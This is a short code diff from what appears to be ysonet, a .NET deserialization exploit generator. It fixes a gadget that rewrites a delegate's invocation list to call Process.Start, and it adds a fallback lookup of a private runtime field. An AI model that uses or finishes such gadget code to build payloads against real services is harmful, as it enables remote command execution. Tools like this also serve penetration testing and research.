@@ -71,7 +71,14 @@ namespace ysonet.Generators
                 set.Add(""); // this is needed (as Process.Start accepts two args)
             }
 
-            FieldInfo fi = typeof(MulticastDelegate).GetField("delegates", BindingFlags.NonPublic | BindingFlags.Instance);
+            // MulticastDelegate stores its invocation list under different private
+            // field names per runtime: Mono calls it "delegates", .NET Framework calls
+            // it "_invocationList". ysonet runs on .NET Framework, so look up the Mono
+            // name first (for when the tool is run on Mono) and fall back to the .NET
+            // Framework name. Using only "delegates" returned null on .NET Framework and
+            // made every generation of this gadget throw a NullReferenceException.
+            FieldInfo fi = typeof(MulticastDelegate).GetField("delegates", BindingFlags.NonPublic | BindingFlags.Instance)
+                        ?? typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
             object[] invoke_list = d.GetInvocationList();
             // Modify the invocation list to add Process::Start(string, string)
             invoke_list[0] = new Func<string, string, Process>(Process.Start);
